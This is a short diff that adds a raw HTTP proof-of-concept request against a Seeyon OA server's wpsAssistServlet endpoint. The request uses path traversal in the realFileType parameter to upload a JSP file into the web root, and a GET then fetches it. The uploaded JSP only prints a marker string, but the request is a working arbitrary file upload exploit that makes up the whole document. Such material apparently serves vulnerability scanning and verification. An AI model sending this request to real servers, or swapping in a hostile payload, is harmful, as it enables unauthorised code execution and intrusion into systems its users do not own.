@@ -1,0 +1,16 @@
+POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2 HTTP/1.1
+Host: 
+Content-Length: 349
+Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
+Accept-Encoding: gzip
+ 
+--59229605f98b8cf290a7b8908b34616b
+Content-Disposition: form-data; name="upload"; filename="123.xls"
+Content-Type: application/vnd.ms-excel
+ 
+<% out.println("seeyon_vuln");%>
+--59229605f98b8cf290a7b8908b34616b--
+
+
+
+GET debugggg.jsp
